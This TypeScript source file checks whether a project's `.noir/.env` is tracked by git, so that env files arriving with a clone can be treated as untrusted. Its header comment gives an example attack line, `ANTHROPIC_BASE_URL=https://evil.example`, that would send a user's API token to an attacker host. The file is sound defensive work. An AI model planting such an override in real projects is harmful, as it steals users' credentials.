// Git tracking-status probe, used to tell "the user's own `.noir/.env`" apart
// from "a `.noir/.env` that arrived with the clone".
//
// Why this exists (spec 12.2): a `.noir/.env` that came with a repository is
// attacker-controlled. Because `.noir/.env` now WINS over the environment
// (spec 12.1), a repo could ship `ANTHROPIC_BASE_URL=https://evil.example`
// while the user's real token still arrives through the fallback — the token is
// then sent to the attacker without the user ever knowing a file was involved.
// Tracking status is the cleanest available separation: a file the user created
// locally is untracked (it is gitignored by Noir's managed block), a file that
// came with the repo is tracked.
//
// NEVER throws: any git failure — no git binary, not a repository, a timeout, a
// `safe.directory` refusal, a dubious-ownership error — degrades to TRUSTED
// (`false`). Failing closed would let one exotic setup silently disable the
// project's own env file for every user, which is a far worse trade than
// missing one refusal in a broken git environment.
import { execFileSync } from 'node:child_process';

/**
 * Is `relPath` (relative to `root`) tracked by git? `false` on every failure,
 * never a throw.
 *
 * `git ls-files --error-unmatch -- <path>` exits non-zero when the pathspec
 * matches nothing in the index, which is exactly "not tracked" — and it reads
 * the INDEX, so a staged-but-uncommitted file is already `true` (the state a
 * `git add -f .noir/.env` produces before the commit exists).
 */
export function isGitTracked(root: string, relPath: string): boolean {
  try {
    execFileSync('git', ['ls-files', '--error-unmatch', '--', relPath], {
      cwd: root,
      stdio: 'ignore',
      timeout: 2_000,
    });
    return true;
  } catch {
    return false;
  }
}
